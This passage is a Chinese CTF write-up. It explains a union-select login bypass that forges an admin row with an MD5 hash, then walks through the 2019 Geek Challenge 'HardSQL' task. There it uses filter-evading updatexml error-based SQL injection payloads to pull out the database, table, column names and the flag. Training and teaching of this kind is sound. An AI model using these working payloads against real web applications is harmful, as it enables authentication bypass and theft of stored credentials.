⑤知识补充

如果数据库中不存在某个数据但你 输入

select * from users where id=1 union select 1,'admin','1';

会生成临时用户名为admin，密码为1的虚拟数据如：

+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | admin    | 1        |
+----+----------+----------+

一般数据库里的密码都是经过加密的，所以测试几次会发现这里是用md5进行加密。我们就可以构造语句

输入密码是123，数据库存的经过md5加密的密码是202cb962ac59075b964b07152d234b70

name=ad' union select 1,'admin','202cb962ac59075b964b07152d234b70'#&pw=123

flag就出来了！

[极客大挑战2019]HardSQL

这关主要是对or,and,空格等都进行了过滤。可以用burpsuite爆破来查询出过滤的关键字。

①注入点查询，发现是字符型。

②这里有报错回显所以可以考虑利用报错注入。

③注出数据库

0'^updatexml(null,concat(0x3a,(select(database()))),null)#

注意：这里后台应该是检查到过滤字符就会出现*你可别被我逮住了，臭弟弟*这句话，所以不能有空格的出现！

④得到数据库为 geek

注出表名

0'^updatexml(null,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))),null)#

注：这里=被过滤，可以用like,in,rlike,regexp来替换

⑤得到表名为 H4rDsq1

注出字段名

0'^updatexml(null,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name)in('H4rDsq1'))),null)#

⑥得到字段名为 id,username,password

注出数据

0'^updatexml(null,concat(0x3a,(select(group_concat(concat_ws('~',id,username,password)))from(H4rDsq1))),null)#

⑦得到这样的数据

XPATH syntax error: ':1~flag~flag{7f82b7b1-82d2-4dff-'

会发现flag只显示了一段怎么办呢？可以利用right函数注出右边部分

0’^updatexml(null,concat(0x3a,(select(group_concat(right(password,30)))from(H4rDsq1))),null)#

⑧拼接出完整的flag！
